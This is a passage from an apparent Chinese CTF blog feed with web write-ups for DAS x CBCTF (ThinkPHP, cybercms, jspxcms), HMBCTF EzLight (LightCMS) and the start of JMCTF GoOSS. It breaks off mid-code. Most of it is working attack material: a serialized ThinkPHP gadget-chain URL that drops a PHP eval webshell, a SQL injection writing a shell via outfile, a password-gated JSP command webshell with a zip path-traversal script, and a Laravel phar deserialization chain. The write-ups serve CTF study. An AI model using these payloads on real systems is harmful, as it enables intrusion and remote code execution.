class="line">http:&#x2F;&#x2F;62a40bd3-4929-4334-a22c-0eb3b4029324.node4.buuoj.cn&#x2F;index.php&#x2F;index&#x2F;labelmodels&#x2F;get_label?tag_array[cfg]&#x3D;O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A137%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问&#x2F;public&#x2F;uploads&#x2F;a.php12ac95f1498ce51d2d96a249c09c1998.php</span><br><span class="line">post ccc&#x3D;system(&#39;&#x2F;readflag&#39;);</span><br><span class="line">拿到flag</span><br></pre></td></tr></table></figure><h3 id="0x02-cybercms"><a href="#0x02-cybercms" class="headerlink" title="0x02 cybercms"></a>0x02 cybercms</h3><p><code>www.zip</code>源码泄露</p><p>后台<code>/admin</code>，登录处存在sql注入漏洞</p><p>主要的验证逻辑</p><p><img src="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/Snipaste_2021-08-01_22-57-47.png"></p><p><code>fl_value,f1_vvv,f1_html</code>对输入做了个过滤</p><p><img src="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/Snipaste_2021-08-01_22-59-24.png"></p><p>都是简单的过滤，对关键字替换为空，双写即可绕过</p><p>但flag没在数据库内，由<code>flag.sh</code>可知flag在根目录，所以这里利用的是sql写shell</p><p>为了防止<code>f1_html</code>对我们插入一句话中的特殊字符进行转义，这里利用char函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;null,null,null,null,char(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outoutfilefile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;#&amp;password&#x3D;122&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;61&amp;submit.y&#x3D;32</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问  &#x2F;shell.php</span><br><span class="line">post  cmd&#x3D;system(&#39;cat &#x2F;flag.txt&#39;);</span><br><span class="line">即可拿flag</span><br></pre></td></tr></table></figure><h3 id="0x03-jspxcms"><a href="#0x03-jspxcms" class="headerlink" title="0x03 jspxcms"></a>0x03 jspxcms</h3><p>找到后台 <code>/cmscp/index.do</code></p><p>账号默认是admin，密码默认为空</p><p><img src="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/Snipaste_2021-08-01_23-10-38.png"></p><p>在后台有一处上传文件，并可以对上传的zip进行解压，这里不能直接上传jsp，而且jspxcms对jsp的访问有限制，访问jsp文件就直接403</p><p>这里存在目录穿越的漏洞，可以构造zip包路径为<code>shell.zip/../../../shell.war</code>，这样子解压后的<code>shell.war</code>就会到<code>webapps</code>目录下，利用其项目部署，war包自动解压的特点，成功将其中的shell文件写到服务器</p><p>写一个shell.jsp 木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;c4t&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><code>jar -cvf shell.war shell.jsp</code></p><p>生成shell.war，然后构造zip</p><p>生成zip的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">binary = <span class="built_in">open</span>(<span class="string">&#x27;shell.war&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment">#print(binary)</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;./test.zip&#x27;</span>):</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf ./test.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;test.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;test.zip&quot;</span>)</span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../shell.war&quot;</span>, binary)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>上传文件并解压</p><p>访问<code>/shell/shell.jsp?pwd=c4t&amp;cmd=cat /flag</code></p><p>得到flag</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-ez-website&quot;&gt;&lt;a href=&quot;#0x01-ez-website&quot; class=&quot;headerlink&quot; title=&quot;0x01 ez_website&quot;&gt;&lt;/a&gt;0x01 ez_website&lt;/h3&gt;&lt;p&gt;在index下的&lt;code&gt;Labelmodels.php&lt;/code&gt;控制器，其中的&lt;code&gt;get_label&lt;/code&gt;方法，获取数据，在没有任何过滤的情况下对数据进行反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="wp" scheme="https://123-prog.github.io/categories/wp/"/>
    
    
    <category term="DAS x CBCTF" scheme="https://123-prog.github.io/tags/DAS-x-CBCTF/"/>
    
  </entry>
  
  <entry>
    <title>(HMBCTF 2021)EzLight</title>
    <link href="https://123-prog.github.io/2021/07/30/HMBCTF-2021-EzLight/"/>
    <id>https://123-prog.github.io/2021/07/30/HMBCTF-2021-EzLight/</id>
    <published>2021-07-30T12:18:50.000Z</published>
    <updated>2021-09-22T10:18:07.809Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-phar上传点"><a href="#0x01-phar上传点" class="headerlink" title="0x01 phar上传点"></a>0x01 phar上传点</h3><p>以<code>admin:admin</code>登录进入后台，在内容管理处，新建文章内容，会有一处可以上传封面图的地方，经过测试，对phar文件稍加修改可以伪造成图片上传，而且路径也是已知的</p><a id="more"></a><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-27-43.png"></p><h3 id="0x02-触发phar反序列化的点"><a href="#0x02-触发phar反序列化的点" class="headerlink" title="0x02 触发phar反序列化的点"></a>0x02 触发phar反序列化的点</h3><p>除了上传文件的接口<code>/admin/neditor/serve/uploadimage</code>外，还有一个可用于远程加载文件的接口</p><p><code>/admin/neditor/serve/catchimage</code></p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-32-01.png"></p><p>会对POST的<code>file</code>参数调用<code>fetchImageFile</code>，进一步跟进</p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-33-28.png"></p><p>通过<code>curl</code>获取远程文件内容，存在<code>$data</code>中，我们可以利用这一点获取到自己服务器上的文件，从而控制data</p><p>跟进<code>Image::make</code></p><p>在<code>vendor/intervention/image/src/Intervention/Image/ImageManager.php</code>可以看到<code>make</code>的定义</p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-38-42.png"></p><p>继续跟进</p><p>最终是调用的<code>AbstractDecoder.php</code>中的<code>init()</code></p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-40-21.png"></p><p>在<code>isUrl()</code>中，跟进<code>initFromUrl</code></p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_20-42-20.png"></p><p>可以看到有<code>file_get_contents</code>操作，触发点就找到了</p><h3 id="0x03-利用链"><a href="#0x03-利用链" class="headerlink" title="0x03 利用链"></a>0x03 利用链</h3><p>lightCMS基于Laravel 6.x开发，但Laravejitiaol5.x的那几条链也好像都可以用</p><p>随便选一条链，生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher(<span class="variable">$function</span>); </span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Queue\CallQueuedClosure(<span class="variable">$parameter</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$parameter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    $function = &#x27;system&#x27;;</span><br><span class="line">    <span class="variable">$parameter</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(</span><br><span class="line">        <span class="variable">$function</span>, </span><br><span class="line">        <span class="variable">$parameter</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>上传phar文件</p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_21-45-31.png"></p><p>在自己的vps上开个http服务，存放phar.txt文件，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;image&#x2F;202107&#x2F;pkCycjoTZSOQbtpygAFQvdr0DhQ8gv2ZDk3aGyKj.gif</span><br></pre></td></tr></table></figure><p><strong>这里不要用vim编辑，否则curl读取到的内容后面会多一个<code>\n</code>，在后面解析的时候<code>isUrl</code>过不去</strong></p><p>post file参数，读取vps文件，触发phar反序列化，拿到flag</p><p><img src="/2021/07/30/HMBCTF-2021-EzLight/Snipaste_2021-07-30_21-48-56.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-phar上传点&quot;&gt;&lt;a href=&quot;#0x01-phar上传点&quot; class=&quot;headerlink&quot; title=&quot;0x01 phar上传点&quot;&gt;&lt;/a&gt;0x01 phar上传点&lt;/h3&gt;&lt;p&gt;以&lt;code&gt;admin:admin&lt;/code&gt;登录进入后台，在内容管理处，新建文章内容，会有一处可以上传封面图的地方，经过测试，对phar文件稍加修改可以伪造成图片上传，而且路径也是已知的&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="php反序列化" scheme="https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="phar反序列化" scheme="https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="LightCMS 后台RCE漏洞" scheme="https://123-prog.github.io/tags/LightCMS-%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>(JMCTF 2021)GoOSS</title>
    <link href="https://123-prog.github.io/2021/07/29/JMCTF-2021-GoOSS/"/>
    <id>https://123-prog.github.io/2021/07/29/JMCTF-2021-GoOSS/</id>
    <published>2021-07-29T14:47:47.000Z</published>
    <updated>2021-09-22T10:16:44.372Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>80端口有index.php</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line">readfile(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> File <span class="keyword">struct</span> &#123;</span><br><span class="line">Content <span class="keyword">string</span> <span class="string">`json:&quot;content&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot; binding:&quot;required&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Url <span class="keyword">struct</span> &#123;</span><br><span class="line">Url <span class="keyword">string</span> <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">md5sum</span><span class="params">(data <span class="keyword">string</span>)</span> <span class="title">string</span></span>&#123;</span><br><span class="line">s := md5.Sum([]<span class="keyword">byte</span>(data))</span><br><span class="line"><span class="keyword">return</span> hex.EncodeToString(s[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMidderware</span> <span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line">fileSystem := http.Dir(<span class="string">&quot;./files/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.String() == <span class="string">&quot;/&quot;</span>&#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">f,err := fileSystem.Open(c.Request.URL.String())</span><br><span class="line"><span class="keyword">if</span> f == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.Next()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">fi, err := f.Stat()</span><br><span class="line"><span class="keyword">if</span>  err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> fi.IsDir() &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">c.Redirect(<span class="number">302</span>,c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">files := <span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">l,_ := f.Readdir(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _,i := <span class="keyword">range</span> l &#123;</span><br><span class="line">files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line"><span class="string">&quot;files&quot;</span> :files,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">data,_ := ioutil.ReadAll(f)</span><br><span class="line">c.Header(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">`attachment; filename=`</span> + fi.Name())</span><br><span class="line">c.Data(<span class="number">200</span>, <span class="string">&quot;text/plain&quot;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">uploadController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> file File</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;file); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: err&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir := md5sum(file.Name)</span><br><span class="line"></span><br><span class="line">_,err:= http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">e := os.Mkdir(<span class="string">&quot;./files/&quot;</span>+dir,os.ModePerm)</span><br><span class="line">_, _ = http.Dir(<span class="string">&quot;./files&quot;</span>).Open(dir)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: e.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">filename := md5sum(file.Content)</span><br><span class="line">path := <span class="string">&quot;./files/&quot;</span>+dir+<span class="string">&quot;/&quot;</span>+filename</span><br><span class="line">err = ioutil.WriteFile(path, []<span class="keyword">byte</span>(file.Content), os.ModePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span 